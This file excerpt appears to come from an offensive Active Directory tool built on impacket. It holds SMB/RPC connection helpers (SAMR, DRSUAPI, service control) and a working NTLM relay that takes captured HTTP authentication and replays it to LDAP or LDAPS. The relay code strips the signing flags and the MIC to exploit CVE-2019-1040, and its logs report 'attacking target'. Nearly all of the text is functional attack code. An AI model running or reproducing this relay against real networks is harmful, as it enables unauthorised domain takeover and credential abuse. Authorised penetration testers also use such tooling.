                                logging.debug('No valid credentials found in cache')
                        else:
                            self.TGS = creds.toTGS(principal)
                            logging.debug('Using TGS from cache')

                        # retrieve user information from CCache file if needed
                        if self.username == '' and creds is not None:
                            self.username = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
                            logging.debug('Username retrieved from CCache: %s' % self.username)
                        elif self.username == '' and len(ccache.principal.components) > 0:
                            self.user = ccache.principal.components[0]['data'].decode('utf-8')
                            logging.debug('Username retrieved from CCache: %s' % self.username)
                
                conn.kerberosLogin(self.username,self.password,self.domain, self.lmhash, self.nthash, self.auth_aes_key, self.dc_ip, self.TGT, self.TGS)
                #conn.kerberosLogin(self.username,self.password,self.domain, self.lmhash, self.nthash, self.auth_aes_key, self.dc_ip, self.TGT, self.TGS)
                # havent support kerberos authentication yet
            else:
                conn.login(self.username,self.password,self.domain, self.lmhash, self.nthash)
            return conn
        except OSError as e:
            logging.debug(str(e))
            return None
        except SessionError as e:
            logging.debug(str(e))
            return None
        except AssertionError as e:
            logging.debug(str(e))
            return None

    def init_samr_session(self):
        if not self.samr:
            self.samr = self.connectSamr()
        return self.samr

    # TODO: FIX kerberos auth
    def connectSamr(self):
        rpctransport = transport.SMBTransport(self.dc_ip, filename=r'\samr')

        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.username, self.password, self.domain, lmhash=self.lmhash, nthash=self.nthash, aesKey=self.auth_aes_key, TGT=self.TGT, TGS=self.TGS)

        rpctransport.set_kerberos(self.use_kerberos, kdcHost=self.kdcHost)

        try:
            dce = rpctransport.get_dce_rpc()
            if self.use_kerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)
            return dce
        except:
            return None

    # stole from PetitPotam.py
    # TODO: FIX kerberos auth
    def connectRPCTransport(self, host=None, stringBindings=None, interface_uuid=None, auth=True, set_authn=False, raise_exceptions=False):
        if not host:
            host = self.dc_ip
        if not stringBindings:
            stringBindings = epm.hept_map(host, samr.MSRPC_UUID_SAMR, protocol = 'ncacn_ip_tcp')
        if not host:
            host = self.dc_ip

        rpctransport = transport.DCERPCTransportFactory(stringBindings)
        #rpctransport.set_dport(445)

        if hasattr(rpctransport, 'set_credentials') and auth:
            rpctransport.set_credentials(self.username, self.password, self.domain, self.lmhash, self.nthash, TGT=self.TGT)

        if hasattr(rpctransport, 'set_kerberos') and self.use_kerberos and auth:
            rpctransport.set_kerberos(self.use_kerberos, kdcHost=self.kdcHost)

        if host:
            rpctransport.setRemoteHost(host)

        dce = rpctransport.get_dce_rpc()

        if set_authn:
            dce.set_auth_type(RPC_C_AUTHN_WINNT)
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        logging.debug("Connecting to %s" % stringBindings)

        try:
            dce.connect()
            if interface_uuid:
                dce.bind(interface_uuid)
            return dce
        except SessionError as e:
            logging.debug(str(e))
            if raise_exceptions:
                raise e
            else:
                return 

    # stolen from pywerview
    def create_rpc_connection(self, host, pipe):
        binding_strings = dict()
        binding_strings['srvsvc'] = srvs.MSRPC_UUID_SRVS
        binding_strings['wkssvc'] = wkst.MSRPC_UUID_WKST
        binding_strings['samr'] = samr.MSRPC_UUID_SAMR
        binding_strings['svcctl'] = scmr.MSRPC_UUID_SCMR
        binding_strings['drsuapi'] = drsuapi.MSRPC_UUID_DRSUAPI

        # TODO: try to fallback to TCP/139 if tcp/445 is closed
        if pipe == r'\drsuapi':
            string_binding = epm.hept_map(host, drsuapi.MSRPC_UUID_DRSUAPI,
                                          protocol='ncacn_ip_tcp')
            rpctransport = transport.DCERPCTransportFactory(string_binding)
            rpctransport.set_credentials(username=self.username, password=self.password,
                                         domain=self.domain, lmhash=self.lmhash,
                                         nthash=self.nthash, TGT=self.TGT, TGS=self.TGS)
        else:
            rpctransport = transport.SMBTransport(host, 445, pipe,
                                                  username=self.username, password=self.password,
                                                  domain=self.domain, lmhash=self.lmhash,
                                                  nthash=self.nthash, doKerberos=self.use_kerberos, TGT=self.TGT, TGS=self.TGS)

        rpctransport.set_connect_timeout(10)
        dce = rpctransport.get_dce_rpc()

        if pipe == r'\drsuapi':
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        try:
            dce.connect()
        except Exception as e:
            logging.critical('Error when creating RPC connection')
            logging.critical(e)
            self.rpc_conn = None
        else:
            dce.bind(binding_strings[pipe[1:]])
            self.rpc_conn = dce

        return self.rpc_conn

    def init_rpc_session(self, host, pipe=r'\srvsvc'):
        if not self.rpc_conn:
            return self.create_rpc_connection(host=host, pipe=pipe)
        else:
            return self.rpc_conn

class LDAPRelayServer(LDAPRelayClient):
    def initConnection(self):
        self.ldap_relay.scheme = "LDAP"
        self.server = ldap3.Server("ldap://%s:%s" % (self.targetHost, self.targetPort), get_info=ldap3.ALL)
        self.session = ldap3.Connection(self.server, user="a", password="b", authentication=ldap3.NTLM)
        self.session.open(False)
        return True

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2['ResponseToken']
        else:
            token = authenticateMessageBlob

        authMessage = NTLMAuthChallengeResponse()
        authMessage.fromString(token)
        # When exploiting CVE-2019-1040, remove flags
        if self.serverConfig.remove_mic:
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
            authMessage['MIC'] = b''
            authMessage['MICLen'] = 0
            authMessage['Version'] = b''
            authMessage['VersionLen'] = 0
            token = authMessage.getData()

        with self.session.connection_lock:
            self.authenticateMessageBlob = token
            request = bind.bind_operation(self.session.version, 'SICILY_RESPONSE_NTLM', self, None)
            response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
            result = response[0]
        self.session.sasl_in_progress = False

        if result['result'] == RESULT_SUCCESS:
            self.session.bound = True
            self.session.refresh_server_info()
            self.ldap_relay.ldap_server = self.server
            self.ldap_relay.ldap_session = self.session

            return None, STATUS_SUCCESS
        else:
            if result['result'] == RESULT_STRONGER_AUTH_REQUIRED and self.PLUGIN_NAME != 'LDAPS':
                logging.error('Server rejected authentication because LDAP signing is enabled. Try connecting with TLS enabled (specify target as ldaps://hostname )')
        return None, STATUS_ACCESS_DENIED

class LDAPSRelayServer(LDAPRelayServer):
    def __init__(self, serverConfig, target, targetPort = 636, extendedSecurity=True ):
        LDAPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self):
        self.ldap_relay.scheme = "LDAPS"
        self.server = ldap3.Server("ldaps://%s:%s" % (self.targetHost, self.targetPort), get_info=ldap3.ALL)
        self.session = ldap3.Connection(self.server, user="a", password="b", authentication=ldap3.NTLM)
        try:
            self.session.open(False)
        except:
            pass
        return True

class HTTPRelayServer(HTTPRelayServer):
    class HTTPHandler(HTTPRelayServer.HTTPHandler):
        def do_relay(self, messageType, token, proxy, content = None):
            if messageType == 1:
                if self.server.config.disableMulti:
                    self.target = self.server.config.target.getTarget(multiRelay=False)
                    if self.target is None:
                        logging.info("HTTPD(%s): Connection from %s controlled, but there are no more targets left!" % (
                            self.server.server_address[1], self.client_address[0]))
                        self.send_not_found()
                        return
  
                    logging.info("HTTPD(%s): Connection from %s controlled, attacking target %s://%s" % (
                        self.server.server_address[1], self.client_address[0], self.target.scheme, self.target.netloc))
                try:
                    ntlm_nego = self.do_ntlm_negotiate(token, proxy=proxy)
                except ldap3.core.exceptions.LDAPSocketOpenError as e:
                    logging.debug(str(e))
                    sys.exit(-1)

                if not ntlm_nego:
                    # Connection failed
                    if self.server.config.disableMulti:
                        logging.error('HTTPD(%s): Negotiating NTLM with %s://%s failed' % (self.server.server_address[1],
                                  self.target.scheme, self.target.netloc))
                        self.server.config.target.logTarget(self.target)
                        self.send_not_found()
                        return
                    else:
                        logging.error('HTTPD(%s): Negotiating NTLM with %s://%s failed. Skipping to next target' % (
                            self.server.server_address[1], self.target.scheme, self.target.netloc))

                        self.server.config.target.logTarget(self.target)
                        self.target = self.server.config.target.getTarget(identity=self.authUser)

                        if self.target is None:
                            logging.info( "HTTPD(%s): Connection from %s@%s controlled, but there are no more targets left!" %
                                (self.server.server_address[1], self.authUser, self.client_address[0]))
                            self.send_not_found()
                            return

                        logging.info("HTTPD(%s): Connection from %s@%s controlled, attacking target %s://%s" % (self.server.server_address[1],
                            self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))

                        self.do_REDIRECT()

            elif messageType == 3:
                authenticateMessage = NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)

                if self.server.config.disableMulti:
                    if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_UNICODE:
                        self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                                    authenticateMessage['user_name'].decode('utf-16le'))).upper()
                    else:
                        self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('ascii'),
                                                    authenticateMessage['user_name'].decode('ascii'))).upper()

                    target = '%s://%s@%s' % (self.target.scheme, self.authUser.replace("/", '\\'), self.target.netloc)

                if not self.do_ntlm_auth(token, authenticateMessage):
                    logging.error("Authenticating against %s://%s as %s FAILED" % (self.target.scheme, self.target.netloc,
                                                                               self.authUser))
                    if self.server.config.disableMulti:
                        self.send_not_found()
                        return
                    # Only skip to next if the login actually failed, not if it was just anonymous login or a system account
                    # which we don't want
                    if authenticateMessage['user_name'] != '':  # and authenticateMessage['user_name'][-1] != '$':
                        self.server.config.target.logTarget(self.target)
                        # No anonymous login, go to next host and avoid triggering a popup
                        self.target = self.server.config.target.getTarget(identity=self.authUser)
                        if self.target is None:
                            logging.info("HTTPD(%s): Connection from %s@%s controlled, but there are no more targets left!" %
                                (self.server.server_address[1], self.authUser, self.client_address[0]))
                            self.send_not_found()
                            return

                        logging.info("HTTPD(%s): Connection from %s@%s controlled, attacking target %s://%s" % (self.server.server_address[1],
                            self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))

                        self.do_REDIRECT()
                    else:
                        # If it was an anonymous login, send 401
                        self.do_AUTHHEAD(b'NTLM', proxy=proxy)
                else:
                    # Relay worked, do whatever we want here...
                    logging.info("HTTPD(%s): Authenticating against %s://%s as %s SUCCEED" % (self.server.server_address[1],
                        self.target.scheme, self.target.netloc, self.authUser))
                    if self.server.config.disableMulti:
                        # We won't use the redirect trick, closing connection...
                        if self.command == "PROPFIND":
                            self.send_multi_status(content)
                        else:
                            self.send_not_found()
                        return
                    else:
                        # Let's grab our next target
                        self.target = self.server.config.target.getTarget(identity=self.authUser)

                        if self.target is None:
                            LOG.info("HTTPD(%s): Connection from %s@%s controlled, but there are no more targets left!" % (
                                self.server.server_address[1], self.authUser, self.client_address[0]))

                            # Return Multi-Status status code to WebDAV servers
                            if self.command == "PROPFIND":
                                self.send_multi_status(content)
                                return

                            # Serve image and return 200 if --serve-image option has been set by user
                            if (self.server.config.serve_image):
                                self.serve_image()
                                return

                            # And answer 404 not found
                            self.send_not_found()
                            return

                        # We have the next target, let's keep relaying...
                        logging.info("HTTPD(%s): Connection from %s@%s controlled, attacking target %s://%s" % (self.server.server_address[1],
                            self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
                        self.do_REDIRECT()

class Relay:
    def __init__(self, target, interface="0.0.0.0", port=80, args=None):
        self.target = target
        self.interface = interface
        self.port = port
        self.args = args
        self.ldap_session = None
        self.ldap_server = None
        self.scheme = None

        target = TargetsProcessor(
                    singleTarget=self.target, protocolClients={
                            "LDAP": self.get_relay_ldap_server,
                            "LDAPS": self.get_relay_ldaps_server,
                        }
                )

        config = NTLMRelayxConfig()
        config.setTargets(target)
        config.setInterfaceIp(interface)
        config.setListeningPort(port)
        config.setProtocolClients(
            {
                "LDAP": self.get_relay_ldap_server,
                "LDAPS": self.get_relay_ldaps_server,
            }
        )
        config.setMode("RELAY")
        config.setDisableMulti(True)
        self.server = HTTPRelayServer(config)

    def get_scheme(self):
        return self.scheme

    def get_ldap_session(self):
        return self.ldap_session

    def get_ldap_server(self):
        return self.ldap_server

    def start(self):
        self.server.start()

        try:
            while True:
                if self.ldap_session is not None:
                    logging.debug("Success! Relayed to the LDAP server. Closing HTTP Server")
                    self.server.server.server_close()
                    break
                sleep(0.1)
        except KeyboardInterrupt:
            print("")
            self.shutdown()
        except Exception as e:
            logging.error("Got error: %s" % e)
            sys.exit()

    def get_relay_ldap_server(self, *args, **kwargs) -> LDAPRelayClient:
        relay_server = LDAPRelayServer(*args, **kwargs)
        relay_server.ldap_relay = self
        return relay_server

    def get_relay_ldaps_server(self, *args, **kwargs) -> LDAPRelayClient:
        relay_server = LDAPSRelayServer(*args, **kwargs)
        relay_server.ldap_relay = self
        return relay_server

    def shutdown(self):
        logging.info("Exiting...")
        sys.exit(0)
